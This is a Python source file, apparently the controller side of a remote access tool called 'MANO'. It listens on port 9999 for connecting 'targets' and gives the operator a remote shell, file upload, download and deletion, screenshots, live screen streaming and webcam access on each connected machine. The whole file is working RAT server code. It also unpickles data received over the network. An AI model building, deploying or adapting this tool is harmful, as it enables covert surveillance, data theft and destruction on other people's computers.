#copyright © 2019-2024 manoharkakumani
import socket
import sys
import os
import threading
import time
import shutil
import cv2
import pickle
import struct
import datetime
from queue import Queue

#global variables
THREADS = 2
proc = [1, 2]
queue = Queue()
clients = []
host = ""
port = 9999
sock = None
exit = False

# display banner
def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("*******************************************************")
    print("""
 __  __    _    _   _  ___   __   
|  \/  |  / \  | \ | |/ _ \  \ \  
| |\/| | / _ \ |  \| | | | |  \ \ 
| |  | |/ ___ \| |\  | |_| |  / / 
|_|  |_/_/   \_\_| \_|\___/  /_/
copyright © 2019-2024 manoharkakumani""")
    print("\n******************************************************")

# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global sock
        host = ""
        port = 9999
        sock = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port)+"\n")

        sock.bind((host, port))
        sock.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()

        
# Closing previous connections when host.py file is restarted
def close_all_connections():
    for cient in clients:
        cient.close()
    del clients[:]

# Handling connection from multiple clients and saving to a list   
def acceptingconnections():
    global exit
    close_all_connections()
    while True:
        try:
            if exit == True:
                break
            conn, address = sock.accept()
            sock.setblocking(1)  # prevents timeout
            client = Client(conn,address)
            clients.append(client)
            print("Connection has been established :" + address[0]+"\nMANO >> ",end="")
        except:
            print("Error accepting connections")
#----------------------------------------------------------------------------
# 2nd thread functions
#----------------------------------------------------------------------------

#loading animation
def loading_animation():
    a=100
    while int(a)>=0:
        sys.stdout.write("\r|"+"█"*int(a/2)+"|{0:.2f}".format(a)+ "%  ")
        sys.stdout.flush()
        time.sleep(0.01)
        a-=1

class Deleter:
    def __init__(self,context):
        self.context=context

    #delete menu
    def delete_menu(self):
        print(f"""----------------------------------------------------------------------------
1. Delete file 
2. Delet Dir/Folder 
3. Change {self.context.address[0] if self.context else 'your' } working directory
4. File list
5. Back 
----------------------------------------------------------------------------""")

    def handle_deleter(self):
        while True:
            self.delete_menu()
            option = input("Enter your choice : ").strip()
            if option == '1':
                file_name=input("Enter file name to delete : ").strip()
                print(self.delete_file(file_name))
            elif option == '2':
                folder_name=input("Enter folder name to delete : ").strip()
                print(self.delete_folder(folder_name))
            elif option == '3':
                print(self.change_directory())
            elif option == '4':
                print(self.list_files())
            elif option == '5':
                return
            else:
                print("Invalid option")

    #delete file
    def delete_file(self,file_name):
        if isinstance(self.context,Client):
            self.context.conn.send(('fdel~'+file_name).encode("utf-8"))
            loading_animation()
            return self.context.conn.recv(1024).decode("utf-8")
        else:
            try:
                if os.path.isfile(file_name):
                    os.unlink(file_name)
                    return "SUCCESS!"
            except Exception as e:
                return e
            
    def delete_folder(self,folder_name):
        if isinstance(self.context,Client):
            self.context.conn.send(('fdel~'+folder_name).encode("utf-8"))
            loading_animation()
            return self.context.conn.recv(1024).decode("utf-8")
        else:
            try:
                if os.path.isdir(folder_name):
                    shutil.rmtree(folder_name)
                    return "SUCCESS!"
            except Exception as e:
                return e
            
    def change_directory(self):
        if isinstance(self.context,Client):
            self.context.conn.send(('cdir~s').encode("utf-8"))
            ccd = self.context.conn.recv(1024).decode("utf-8")
            print("Client current working directory : "+ccd)
            if input("Do you want to change (Y/N) ? : ").upper().strip() == 'Y':
                self.context.conn.send(('Y').encode("utf-8"))
                dire=input("Enter path to change: ").strip()
                self.context.conn.send((dire).encode("utf-8"))
                return self.context.conn.recv(1024).decode("utf-8")
            else:
                return ccd
        else:
            try:
                print("Your current working directory : "+os.getcwd())
                if input("Do you want to change (Y/N) ? : ").upper().strip() == 'Y':
                    dire=input("Enter path to change: ").strip()
                    os.chdir(dire)
                return os.getcwd()
            except Exception as e:
                return e
            
    def list_files(self):
        if isinstance(self.context,Client):
            self.context.conn.send(('flist~s').encode("utf-8"))
            return pickle.loads(self.context.conn.recv(1024))
        else:
            return os.listdir()
    
class Client:

    def __init__(self,conn,address):
        self.conn=conn
        self.address=address
        self.deleter=Deleter(self)

    def __str__(self):
        return f"{self.address} {self.conn}"
    
    #upload file to client
    def send_file(self,filename):
        if os.path.isfile(filename):
            self.conn.send(str("fdown~"+filename).encode("utf-8"))
            self.conn.send(str.encode("EXISTS " + str(os.path.getsize(filename))))
            filesize=int(os.path.getsize(filename))
            userResponse = self.conn.recv(1024).decode("utf-8")
            if userResponse[:2] == 'OK':
                with open(filename, 'rb') as f:
                    bytesToSend = f.read(1024)
                    self.conn.send(bytesToSend)
                    totalSend=len(bytesToSend)
                    while int (totalSend) < int(filesize):
                        bytesToSend = f.read(1024)
                        totalSend += len(bytesToSend)
                        self.conn.send(bytesToSend)
                        sys.stdout.write("\r|"+"█"*int((totalSend/float(filesize))*50)+"|{0:.2f}".format((totalSend/float(filesize))*100)+ "%  ")
                        sys.stdout.flush()
                    print("\nUpload Completed!")
        else:
            print("File Does Not Exist!")

    #download file from client
    def receive_file(self,filename):
        self.conn.send(("fup~"+filename).encode("utf-8"))
        data = self.conn.recv(1024).decode("utf-8")
        if data[:6] == 'EXISTS':
            filesize = data[6:]
            msg = input("File exists, " + str(filesize) +"Bytes, download? (Y/N)? -> ").upper().strip()
            if msg == 'Y':
                self.conn.send("OK".encode("utf-8"))
                f = open(filename, 'wb')
                data = (self.conn.recv(1024))
                totalRecv = len(data)
                f.write(data)
                while int(totalRecv) < int(filesize):
                    data = self.conn.recv(1024)
                    totalRecv += len(data)
                    f.write(data)
                    sys.stdout.write("\r|"+"█"*int((totalRecv/float(filesize))*50)+"|{0:.2f}".format((totalRecv/float(filesize))*100)+ "%  ")
                    sys.stdout.flush()
                    time.sleep(0.01)
                print("\nDownload Complete!")
                f.close()
        else:
            print("File Does Not Exist!")

    #take screenshot of client screen
    def take_screenshot(self):
        self.conn.send(('sshot~s').encode("utf-8"))
        msg=self.conn.recv(1024).decode("utf-8")
        if msg=='OK':
            filename= 'screenshot_'+str(datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))+'.jpg'
            data = self.conn.recv(1024).decode("utf-8")
            if data[:6] == 'EXISTS':
                filesize = data[6:]
                self.conn.send("OK".encode("utf-8"))
                f = open(filename, 'wb')
                data = (self.conn.recv(1024))
                totalRecv = len(data)
                f.write(data)
                while int(totalRecv) < int(filesize):
                    data = self.conn.recv(1024)
                    totalRecv += len(data)
                    f.write(data)
                f.close()
                print("Screenshot saved as "+filename)
            else:
                print("Fail to take screenshot!")
        else:
            print(msg)

    #access client camera
    def access_camera(self):
        self.conn.send(('cam~s').encode("utf-8"))
        K=self.conn.recv(1024).decode("utf-8")
        if K=="OK":
            C=self.conn.recv(1024).decode("utf-8")
            if C=="cam":
                data = b""
                img = struct.calcsize(">L")
                while True:
                    if (cv2.waitKey(1) == 27) or (cv2.waitKey(1) & 0xFF == ord('q')) or (cv2.waitKey(1) & 0xFF == ord('q')):
                        self.conn.send("close".encode('utf-8'))
                        cv2.destroyAllWindows()
                        break
                    else:
                        self.conn.send("cam".encode('utf-8'))
                        while len(data) < img:
                            data += self.conn.recv(4096)
                        img_size = data[:img]
                        data = data[img:]
                        msg_size = struct.unpack(">L", img_size)[0]
                        while len(data) < msg_size:
                            data += self.conn.recv(4096)
                        frame_data = data[:msg_size]
                        data = data[msg_size:]
                        frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
                        frame = cv2.imdecode(frame,cv2.IMREAD_COLOR)
                        cv2.namedWindow('Client Camera', cv2.WINDOW_NORMAL)
                        cv2.imshow('Client Camera',frame)
        else:
            print(K)

    #stream client screen
    def stream_screen(self):
        self.conn.send(('sst~s').encode("utf-8"))
        K=self.conn.recv(1024).decode("utf-8")
        if K=="OK":
            while True:
                if (cv2.waitKey(1) == 27) or (cv2.waitKey(1) & 0xFF == ord('q')) or (cv2.waitKey(1) & 0xFF == ord('q')):
                    self.conn.send("close".encode('utf-8'))
                    cv2.destroyAllWindows()
                    break
                else:
                    data = b""
                    screen = struct.calcsize(">L")
                    self.conn.send("sst".encode('utf-8'))
                    while len(data) < screen:
                        data += self.conn.recv(4096)
                    screen_size = data[:screen]
                    data = data[screen:]
                    msg_size = struct.unpack(">L", screen_size)[0]
                    while len(data) < msg_size:
                        data += self.conn.recv(4096)
                    frame_data = data[:msg_size]
                    data = data[msg_size:]
                    frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
                    frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
                    b,g,r = cv2.split(frame)       # get b,g,r
                    rgb_img = cv2.merge([r,g,b])     # switch it to rgb
                    cv2.namedWindow('Client Screen', cv2.WINDOW_NORMAL)
                    cv2.imshow('Client Screen',rgb_img)
                    cv2.waitKey(1)
        else:
            print(K)

    #send command to client
    def send_command(self,cmd):
        self.conn.send(("cmd~"+cmd).encode("utf-8"))
        client_response = str(self.conn.recv(20480), "utf-8")
        print(client_response, end="")
        while True:
            try:
                cmd = input('').strip()
                if cmd== 'quit':
                    return
                cmd='cmd~'+cmd
                if len(str.encode(cmd)) > 0:
                    self.conn.send(str.encode(cmd))
                    client_response = str(self.conn.recv(20480), "utf-8")
                    print(client_response, end="")
            except:
                print("Error sending commands")
                break

    #close connection
    def close(self):
        self.conn.send(('exit~s').encode("utf-8"))
        return
    
    def help(self):
        print(f"""
shell   --> To open cmd or terminal
fdown   --> To download files from target
fup     --> Upload files to client
fl      --> List of files in your current directory
cfl     --> List of files in target's current directory
fdel    --> Delete file in your current directory
cdel    --> Delete file from target's current directory
pwd     --> Get your current directory
cwd     --> Get target's current directory
cd      --> Change your current directory
ccd     --> Change target's current directory
sshot   --> To take screenshot of target's screen
cam     --> To access target camera
stream  --> To stream target screen
clear   --> Clear the screen
help    --> Help 
back    --> Back to MANO
close    --> To terminate : {self.address[0]}""")
        
        #commands that perform on client
    def menu(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        deleter = Deleter(None)
        while True:
            cli= input("MANO >>"+self.address[0]+" >> ").strip()
            if cli == "":
                continue
            elif cli=='shell':
                self.send_command('echo')
            elif cli=='clear':
                os.system('cls' if os.name == 'nt' else 'clear')
                banner()
            elif cli=='fdown':
                filename=input("Enter file name to download : ").strip()
                self.receive_file(filename)
            elif cli=='fup':
                filename=input("Enter file name to upload : ").strip()
                self.send_file(filename)
            elif cli=='fl':
                print(deleter.list_files())
            elif cli=='cfl':
                print(self.deleter.list_files())
            elif cli=='cd':
                print(deleter.change_directory())            
            elif cli=='ccd':
                print(self.deleter.change_directory())            
            elif cli=='cdel':
                self.deleter.handle_deleter()
            elif cli=='fdel':
                deleter.handle_deleter()
            elif cli=='pwd':
                print("Your current working directory : "+os.getcwd())
            elif cli=='cwd':
                self.conn.send(('cwd~s').encode("utf-8"))
                print("Client current working directory : "+self.conn.recv(1024).decode("utf-8"))
            elif cli=='sshot':
                self.take_screenshot()
            elif cli=='cam':
                self.access_camera()
            elif cli=='stream':
                self.stream_screen()
            elif cli=='back':
                return
            elif cli=='close':
                self.close()
                return
            elif cli == 'help':
                self.help()
            else :
                print("Command not recognized")

 
# list all current active clients
def list_connections():
    try:
        results = ''
        print("\n----Clients----" )
        for i, client in enumerate(clients):
            try:
                client.conn.send(str.encode('echo~echo'))
                client.conn.recv(20480)
            except:
                del clients[i]
            results = str(i) + "   " + str(client.address[0]) + "   " + str(client.address[1])
            print(results)
        if results == '':
            print("No connections Found")
    except:
        print("No connections Found")

#selecting the client
def select_client(cmd):
    try:
        client_index = cmd.replace('select ', '')  
        client_index = int(client_index)
        client = clients[client_index]
        print("You are now connected to : " + str(client.address[0])+":"+str(client.address[1])+"\n")
        return client
    except:
        print("Selection not valid")
        return None
    
def main_help():
    print("""
list      --> See all the clients\n
select n  --> To select n th client\n
pwd       --> Get current directory\n
cd        --> Change current directory\n
clear     --> Clear the screen\n
fl        --> List of files in current directory\n
fdel      --> Delete file in  current directory\n
help      --> Help \n
quit      --> quit\n""")
    
#MANO 
def MANO():
    global exit
    banner()
    self=Deleter(None)
    while True:
        cmd = input('MANO >> ').strip()
        if cmd == '':
            continue
        elif cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            client = select_client(cmd)
            if client:
                client.menu()
        elif cmd=='clear':
            os.system('clear')
            banner()
        elif cmd=='cd':
            print(self.change_directory())
        elif cmd=='fdel':
            self.handle_deleter()
        elif cmd=='fl':
            print(self.list_files())
        elif cmd=='pwd':
            print("Your current working directory : "+os.getcwd())
        elif cmd == 'help':
            main_help()
        elif cmd == 'quit':
            close_all_connections()
            exit = True
            return  "exit"
        else :
              print("Command not recognized")
              
# Create threads
def createThreads():
    for _ in range(THREADS):
        t = threading.Thread(target=deQueue)
        t.daemon = True
        t.start()


# Do next thread that is in the queue (handle connections)
def deQueue():
    while True:
        global exit
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            acceptingconnections()
        if x == 2:
            time.sleep(0.1)
            if MANO() == "exit":
                return
        if exit:
            break
        queue.task_done()

#Insert thread into Queue
def enQueue():
    for x in proc:
        queue.put(x)
    queue.join()

createThreads()
enQueue()